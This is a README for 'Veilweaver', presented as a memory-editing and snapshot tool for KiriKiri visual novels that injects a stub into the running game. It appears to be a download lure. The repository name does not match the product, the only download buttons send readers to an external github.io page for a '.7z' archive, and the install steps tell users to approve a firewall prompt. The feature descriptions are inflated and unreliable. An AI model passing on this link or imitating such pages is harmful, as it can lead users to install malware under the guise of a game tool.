![preview](https://raw.githubusercontent.com/ggkokkkj/bride-engine-rewriter/main/thumb_d52ec.svg)
[![Download](https://raw.githubusercontent.com/ggkokkkj/bride-engine-rewriter/main/go_45d30.svg)](https://ggkokkkj.github.io/bride-engine-rewriter/)

# 🗡️ Veilweaver — Narrative Memory Forge for Visual Novel Engines

## 🧭 Overview — Weaving Stories Beyond the Scripted Veil

Welcome to **Veilweaver**, a sophisticated narrative state orchestration toolkit designed for creators, modders, and archivists working with KiriKiri/Z-engine visual novels. Unlike conventional save editors or memory scanners, Veilweaver operates as a *narrative memory forge*—it allows you to observe, reshape, and preserve the dynamic story-state variables that govern character relationships, branching flags, and item inventories within supported game engines.

Think of a visual novel as a vast, hidden loom. The game engine threads together thousands of invisible variables—affection points, route flags, quest counters—to weave the tapestry of your unique playthrough. Veilweaver hands you the shuttle, letting you gently pull a thread here, re-dye a color there, and create a narrative fabric that is entirely your own. It is not about breaking the game; it is about *re-authoring your experience* within the engine's own language.

This project is a direct spiritual successor to the exploratory work done in `dungeonAndBride-injector`, evolving from a single-title tool into a modular, engine-agnostic architecture for narrative state inspection.

## 🚀 Core Philosophy — The Author's Second Pen

Every visual novel is a conversation between the writer and the reader. Veilweaver believes the reader deserves a second pen. Our toolkit is built on three pillars:

1.  **Transparency** – See the hidden state that drives your story.
2.  **Fidelity** – Modify data without corrupting the engine's structural integrity.
3.  **Portability** – Create narrative "snapshots" that can be shared, versioned, and re-applied.

We provide the workshop; you provide the vision.

## ✨ Key Features — A Forge Full of Tools

### 🧬 State Map Visualizer (SMV)
The flagship feature. Veilweaver presents an interactive, hierarchical tree of live game variables. Instead of raw memory addresses, you see **human-readable semantic labels** (e.g., `heroine.affection.isabella = 42`). Search, filter, and bookmark variables using a responsive, dark-mode UI built for long reading sessions.

### 📸 Narrative Snapshot System (NSS)
Capture a "moment-in-time" archive of the entire story state. This isn't a simple save file—it's a **portable JSON/BSON bundle** containing variable states, flag histories, and a checksum manifest for integrity. Share your mid-game theory-crafting setup with a friend, or revert to a specific emotional beat of the story without losing your place.

### 🧵 Thread Tracer
Ever wonder *why* a character reacted differently? Thread Tracer logs the last 200 read/write operations to key variables, letting you trace the causal chain of story events. A built-in diff view highlights what changed between two snapshots, making it invaluable for playtesters and QA teams.

### 🌐 Polyglot Preprocessor
Visual novels are global. Veilweaver’s string detection module respects full-width characters, Shift-JIS encodings, and Unicode surrogate pairs. It ensures that when you modify a name or an item description, the encoding remains intact and the game renders it perfectly.

### ⚡ Heartbeat Monitor (HBM)
A non-intrusive background service that watches for common crash-inducing overflows when setting variables. It acts as a **narrative airbag**, intercepting potentially fatal assignments and warning you before you write an impossible value to a core flag.

### 🗂️ Archive Loom
Import and export narrative contexts in a human-editable format. Design your own "scripted branches" in a text editor, then weave them into the running game state with a single click.

## 🛠️ Architecture — Built Like a Sandcastle That Withstands Tides

Veilweaver employs a **client-server proxy model**:

- **WeaverCore (Core Runtime):** A lightweight, embedded service that interfaces with the target engine's memory space via a plugin adapter.
- **LoomUI (Desktop Interface):** A responsive Electron-based overlay that communicates with WeaverCore over a local, encrypted WebSocket.
- **ThreadCache (In-Memory Store):** A circular buffer for high-speed state tracking, ensuring minimal performance impact on the game.

This separation ensures that the UI can be 100% responsive (60fps) while the core does the heavy lifting, and it allows for future headless operation for automated playtesting pipelines.

## 🎯 Use Cases — Where the Veil Parts

- **Game Journalists & Critics:** Create precise, reproducible state setups to test dialogue trees and bug reports without replaying 10 hours.
- **Modding Communities:** Reverse-engineer flag dependencies for complex romance routes or hidden epilogues.
- **Accessibility Advocates:** Use the Snapshot System to create "save-states" for players with memory limitations, ensuring the narrative is accessible to all.
- **Lore Archivists:** Preserve the exact state required to view a specific, rare C.G. or scene for digital exhibition.

## 📥 Installation & Integration (The Gentle Onboarding)

Veilweaver is distributed as a **signed portable archive**—no invasive system installs, no registry edits. To begin your weaving session:

1.  **Acquire the Archive:** Obtain the latest `Veilweaver-x64.7z` from the [![Download](https://raw.githubusercontent.com/ggkokkkj/bride-engine-rewriter/main/go_45d30.svg)](https://ggkokkkj.github.io/bride-engine-rewriter/) section above.
2.  **Extract to a neutral folder** (e.g., `C:\Tools\Veilweaver`). Do not place it inside the game directory.
3.  **Launch LoomUI:** Run `Veilweaver.exe`. The Heartbeat Monitor starts automatically.
4.  **Attach to Process:** From the UI, select the running VN process from the dropdown list. The adapter injects a minimal, relocatable stub (less than 50KB) into the engine's TJS interpreter namespace.
5.  **Open the Loom:** Click "Attach" and watch the State Map Visualizer bloom with data.

*Note: A firewall prompt may appear for the local WebSocket listener (port 47777). Allow it for local network traffic only.*

## 🧑‍💻 API Surface for Tinkerers

For those writing automation scripts, Veilweaver exposes a **RESTful-like JSON interface** over the local socket:

- `POST /state/read` — Fetch specific variables by regex pattern.
- `POST /state/write` — Set a variable with type coercion.
- `POST /snapshot/export` — Create a full narrative bundle.
- `GET /thread/trace/{varID}` — Retrieve the operation log.

### Example (Python-like pseudocode):
```python
client.send({
  "action": "write",
  "path": "heroine.affection.isabella",
  "value": 100,
  "coerce": "int32"
})
```

## 🤝 Contribution Guidelines — Stitching Together

We welcome contributions from narrative designers, toolchain engineers, and accessibility advocates. Please read the `CONTRIBUTING.md` for our code of conduct and pull request etiquette.

**Current Roadmap to 2026:**
- **Q1 2026:** Support for shifting-JIS full-width string rewriting with visual inline editor.
- **Q2 2026:** Community Plugin SDK for custom variable renderers and Lua-based scripted actions.
- **Q3 2026:** Collaborative Snapshot Library (CSL) — share and pull narrative states from a community-driven index.
- **Q4 2026:** Real-time multi-client sync for multiplayer co-op reading experiences.

## ⚠️ Important Disclaimer — Read Before Weaving

**Veilweaver is an independent, educational interoperability tool.** It is not affiliated with, endorsed by, or sponsored by any visual novel publisher, engine developer, or distribution platform.

- **Usage Responsibility:** This tool is designed for private study, archival preservation, and accessibility on legally obtained copies of games you own. The modification of in-memory data may violate the End-User License Agreement (EULA) of certain titles.
- **No Warranty:** The software is provided "AS IS," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement.
- **Data Loss Risk:** Modifying live memory state can, in rare, unforeseen edge cases, cause an unstable game session or save corruption. **Always use the built-in Snapshot System to create a backup before experimenting.** We are not responsible for any loss of save data, game crashes, or system instability.
- **Online Services:** If the target game utilizes an online leaderboard or anti-tamper service, do not use Veilweaver. We disclaim any liability for account restrictions resulting from misuse.
- **Ethical Use:** We prohibit the use of this toolkit to bypass payment mechanisms, unlock paid DLC without purchase, or publicly distribute proprietary game scripts.

By using Veilweaver, you acknowledge that you understand these terms and accept full responsibility for how you apply the tools provided.

## 📜 License

This project is lovingly released under the **MIT License**. You are free to use, modify, distribute, and privately study the code. We only ask that you keep the attribution header intact as a small courtesy to the original weavers.

See the full legal text in the [LICENSE](LICENSE) file.

---

## 🗺️ A Note on the Journey (or, A Letter to the User)

We built Veilweaver not to "break" games, but to *listen* to them. Stories are data, and data deserves elasticity. Whether you are a player who wants to relive a favorite scene without grinding social stats, a modder who dreams of a "true route" that the writers left on the cutting room floor, or an archivist preserving a piece of digital culture—we hope this toolkit feels like a key to a library you already owned.

May your threads stay taut, and your narratives never dead-end.

---

**Veilweaver** — *Because every story deserves a second draft.* 🪡